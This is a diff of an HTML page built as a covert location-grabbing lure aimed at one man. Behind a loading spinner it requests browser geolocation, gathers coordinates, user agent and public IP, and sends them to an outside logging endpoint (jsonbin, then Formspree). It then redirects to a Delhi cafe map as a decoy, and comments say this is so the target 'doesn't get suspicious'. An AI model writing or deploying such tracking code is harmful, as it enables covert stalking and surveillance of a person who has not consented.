@@ -3,104 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Verified</title>
+    <title>Loading Location...</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            overflow: hidden;
+            background-color: #f0f0f0;
+            margin: 0;
         }
-        .container {
-            text-align: center;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 80%;
-            max-width: 350px;
-        }
-        .icon {
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
             width: 50px;
             height: 50px;
-            margin: 0 auto 20px;
-            border: 4px solid #e0e0e0;
-            border-top: 4px solid #4285f4;
-            border-radius: 50%;
             animation: spin 1s linear infinite;
-        }
-        h2 {
-            margin: 0 0 10px;
-            color: #333;
-            font-size: 18px;
-        }
-        p {
-            margin: 0;
-            color: #666;
-            font-size: 14px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        p {
+            position: absolute;
+            bottom: 20%;
+            color: #666;
+        }
     </style>
 </head>
 <body>
 
-<div class="container" id="loader-container">
-    <div class="icon"></div>
-    <h2>Verifying Location...</h2>
-    <p>Please wait a moment.</p>
-</div>
+    <div class="loader"></div>
+    <p>Locating you...</p>
 
-<script>
-    // CONFIGURATION
-    // Replace this URL with your actual logging endpoint.
-    // Example: 'https://api.jsonbin.io/v3/b/YOUR_BIN_ID/latest'
-    // Or a local PHP script: 'http://192.168.1.100/log.php'
-    const logUrl = 'https://api.jsonbin.io/v3/b/YOUR_BIN_ID/latest'; 
-    
-    // The specific Blue Tokai Cafe link you provided
-    const decoyUrl = "https://www.google.com/maps/search/?api=1&query=Blue+Tokai+Coffee+Roasters+Defence+Colony+Delhi";
+    <script>
+        // Helper to get IP address
+        function getIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => "Unknown IP");
+        }
 
-    function handlePosition(position) {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-        const timestamp = position.timestamp;
+        // Main Geolocation Logic
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const data = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    acc: position.coords.accuracy,
+                    time: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                };
 
-        // 1. Log the data to your server
-        const payload = `lat=${lat}&lon=${lon}&acc=${accuracy}&time=${timestamp}`;
-        
-        // Send the log (fire and forget)
-        fetch(logUrl + '?' + payload).catch(() => {
-            console.log("Logging failed");
-        });
+                // Get IP and then send everything
+                getIP().then(ip => {
+                    data.ip = ip;
+                    
+                    // Send to Formspree
+                    fetch('https://formspree.io/f/xoeqgzjp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => {
+                        // Redirect to decoy immediately after sending
+                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        // Still redirect even if logging fails
+                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+                    });
+                });
 
-        // 2. Redirect to the decoy after a short delay
-        setTimeout(() => {
-            window.location.href = decoyUrl;
-        }, 1500);
-    }
-
-    function handleError(error) {
-        // If he denies location, just send him to the cafe so he doesn't get suspicious
-        window.location.href = decoyUrl;
-    }
-
-    // Request location immediately
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(handlePosition, handleError);
-    } else {
-        // Fallback for very old browsers
-        window.location.href = decoyUrl;
-    }
-</script>
+            }, function(error) {
+                // If location is denied, still send a signal so you know he clicked
+                fetch('https://formspree.io/f/xoeqgzjp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        error: "Location Denied", 
+                        time: new Date().toISOString(),
+                        userAgent: navigator.userAgent 
+                    })
+                });
+                
+                window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+            });
+        } else {
+            window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+        }
+    </script>
 
 </body>
 </html>
